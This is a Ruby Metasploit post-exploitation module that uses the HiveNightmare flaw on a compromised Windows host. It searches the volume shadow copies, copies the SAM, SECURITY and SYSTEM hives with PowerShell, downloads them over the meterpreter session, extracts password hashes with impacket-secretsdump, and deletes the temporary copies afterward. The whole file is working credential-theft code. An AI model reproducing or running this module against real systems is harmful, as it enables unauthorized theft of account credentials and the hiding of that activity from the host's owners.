class MetasploitModule < Msf::Post

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Powershell
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Hashdump with HiveNightmare',
        'Description'   => %q{
		This module downloads the Hive Files using the exploit HiveNightmare
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'ritaban' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
    register_options(
      [
        OptString.new("PATHNAME", [ true, "Path for the sam file stored in shadow copy", "\\\\?\\GLOABLROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config"]),
      ])
  end

  def run

    print_status("Checking path existence")

    for i in 1..100 do
      path = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy#{i}\\Windows\\System32\\config"
      if directory?(path)
        # Copy the sam file

        sam = path + "\\SAM"
        security = path + "\\SECURITY"
        system = path + "\\SYSTEM"
        print_status("Reading from: #{sam}")

        username = get_env('USERNAME')

        filepath = "C:\\Users\\#{username}\\AppData\\Local\\Temp\\SAM-xxx"
        psh_exec("Copy-Item -LiteralPath #{sam} C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\SAM-xxx")
        client.fs.file.download("/home/vagrant/testing_postmodules/SAM-xxx",filepath)

        print_status("Reading from: #{security}")

        filepath = "C:\\Users\\#{username}\\AppData\\Local\\Temp\\SECURITY-xxx"
        psh_exec("Copy-Item -LiteralPath #{security} C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\SECURITY-xxx")
        client.fs.file.download("/home/vagrant/testing_postmodules/SECURITY-xxx",filepath)

        print_status("Reading from: #{system}")

        filepath = "C:\\Users\\#{username}\\AppData\\Local\\Temp\\SYSTEM-xxx"
        psh_exec("Copy-Item -LiteralPath #{system} C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\SYSTEM-xxx")
        client.fs.file.download("/home/vagrant/testing_postmodules/SYSTEM-xxx",filepath)

        # Removing the moved files

        system("impacket-secretsdump -sam SAM-xxx -system SYSTEM-xxx -security SECURITY-xxx local")
        psh_exec("rm C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\*xxx")
        break
      end
    end
  end
end
